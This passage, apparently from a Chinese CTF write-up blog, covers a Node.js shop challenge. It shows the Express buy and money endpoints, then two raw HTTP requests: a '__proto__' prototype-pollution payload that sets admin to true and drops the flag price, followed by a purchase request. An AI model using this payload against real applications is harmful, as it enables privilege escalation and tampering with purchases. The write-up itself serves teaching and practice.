<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/v1/buy&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; product, quantity &#125; = req.<span class="property">body</span>;     </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> product === <span class="string">&#x27;undefined&#x27;</span> || <span class="keyword">typeof</span> quantity !== <span class="string">&#x27;number&#x27;</span> || quantity &lt;= <span class="number">0</span> || !products[product]) &#123;    <span class="comment">//products[product]要存在</span></span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid request&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (products[product].<span class="property">quantity</span> &gt;= quantity) &#123;</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">money</span> &gt;= products[product].<span class="property">price</span> * quantity) &#123;</span><br><span class="line">            products[product].<span class="property">quantity</span> -= quantity;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">money</span> -= products[product].<span class="property">price</span> * quantity;</span><br><span class="line">            res.<span class="title function_">json</span>(products[product]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">402</span>).<span class="title function_">send</span>(<span class="string">&#x27;Not enough money&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">451</span>).<span class="title function_">send</span>(<span class="string">&#x27;Not enough product&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<ol start="3">
<li>&#x2F;api&#x2F;v1&#x2F;money 可以修改金额</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/v1/money&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">admin</span>) &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">money</span> += req.<span class="property">body</span>.<span class="property">money</span>;    </span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Money added&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Not admin&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>





<p>其中&#x2F;api&#x2F;v1&#x2F;sell存在<code>原型链污染</code></p>
<p>第一步，通过链污染修改<code>req.session.admin为true</code>，覆盖flags的price为1</p>
<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721144112916.png" alt="image-20220721144112916"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1/sell HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">206.189</span>.<span class="number">236.145</span>:<span class="number">3000</span></span><br><span class="line">Content-Length: <span class="number">48</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">103.0</span>.<span class="number">5060.114</span> Safari/<span class="number">537.36</span> Edg/<span class="number">103.0</span>.<span class="number">1264.62</span></span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Origin: http://206.189.236.145:3000</span></span><br><span class="line"><span class="comment">Referer: http://206.189.236.145:3000/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span></span><br><span class="line"><span class="comment">Cookie: connect.sid=s%3AhXJloF5ZCExKQ8ackKCPnlbWgVmBlFUx.63vNgL4nwnZ31RWXUsA9JNCPngfkG7XARAhedfxam0M</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;&quot;__proto__&quot;:&#123;&quot;admin&quot;:true&#125;,&quot;flags&quot;:&#123;&quot;price&quot;:1&#125;&#125;</span></span><br></pre></td></tr></table></figure>



<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721143941235.png" alt="image-20220721143941235"></p>
<p>造成的结果</p>
<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721144203842.png" alt="image-20220721144203842"></p>
<p>第二步，直接购买flags，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1/buy HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">206.189</span>.<span class="number">236.145</span>:<span class="number">3000</span></span><br><span class="line">Content-Length: <span class="number">32</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">103.0</span>.<span class="number">5060.114</span> Safari/<span class="number">537.36</span> Edg/<span class="number">103.0</span>.<span class="number">1264.62</span></span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Origin: http://206.189.236.145:3000</span></span><br><span class="line"><span class="comment">Referer: http://206.189.236.145:3000/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span></span><br><span class="line"><span class="comment">Cookie: connect.sid=s%3AhXJloF5ZCExKQ8ackKCPnlbWgVmBlFUx.63vNgL4nwnZ31RWXUsA9JNCPngfkG7XARAhedfxam0M</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;&quot;product&quot;:&quot;flags&quot;,&quot;quantity&quot;:1&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="E:\markdown\img\image-20220721144002542-16613913650561.png" alt="image-20220721144002542"></p>

    </div>
    
        <hr class="fhr">
        <div id="vcomments"></div>
    
</div>


    <div class="footer" id="footer">
    <p><h4>Copyright © 2020 | Author: Sk1y | Theme By <a class="theme-author" target="_blank" rel="noopener" href="https://github.com/Xunzhuo/hexo-theme-coder" style="font-size:14px; color: #969696">Coder</a></h4>
    
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        <span id="busuanzi_container_site_pv">Page Views: <span id="busuanzi_value_site_pv"></span></span>
        <span class="post-meta-divider">|</span>
        <span id="busuanzi_container_site_uv">Unique Visitors: <span id="busuanzi_value_site_uv"></span></span>
    
    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
        <input type="checkbox" name="switch" id="update_style">
        <span class="el-switch-style"></span>
    </label>

    <!--         <script type="text/javascript">
    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
    </script> -->
</p>
</div>

<input type="hidden" id="web_style" value="black">
<input type="hidden" id="valine_appid" value="MECC3mIv4gyVBwvpqsAnBsX8-gzGzoHsz">
<input type="hidden" id="valine_appKey" value="KuxLFi0F1Upj5MRy1yo9oAwH">

<script src="/libs/jquery.min.js"></script>


<script src="/libs/highlight/highlight.pack.js"></script>

<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>

<script src="/js/js.js"></script>

<style type="text/css">
.v * {
color: #698fca;
}
.v .vlist .vcard .vhead .vsys {
color: #3a3e4a;
}
.v .vlist .vcard .vh .vmeta .vat {
color: #638fd5;
}
.v .vlist .vcard .vhead .vnick {
color: #6ba1ff;
}
.v a {
color: #8696b1;
}
.v .vlist .vcard .vhead .vnick:hover {
color: #669bfc;
}
</style>
    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
    <!-- <aside id="toc" class="toc-article" >
      <div class="toc-title">
         <p>
            <span> 目录 </span>
         </p>
      </div>
      
</aside>

<!-- <div style="width:100%;float:left;margin-bottom:25px;">
    <div id="toc" class="toc-article" >
       <div class="toc-title">
          <p>
             <span> 目录 </span>
             <a href="#" onclick="javascript:return openct(this);" title="展开">[+]</a>
          </p>
       </div>
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BDSecCTF2022-Web"><span class="toc-text">BDSecCTF2022-Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Jungle-Templating"><span class="toc-text">Jungle Templating</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Awesome-Note-Keeping"><span class="toc-text">Awesome Note Keeping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Awesome-Calculator"><span class="toc-text">Awesome Calculator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Knight-Squad-Shop"><span class="toc-text">Knight Squad Shop</span></a></li></ol></li></ol>
    </div>
 </div>
 <script>
    function openct(e){    
       if (e.innerHTML == '[+]') {
          $(e).attr('title', '收起').html('[-]');
          $(".toc-article ol").show();
       } else {
          $(e).attr('title', '展开').html('[+]');
          $(".toc-article ol").hide();
       }
       e.blur();
       return false;
    }
 </script> --> -->
</body>
</html>
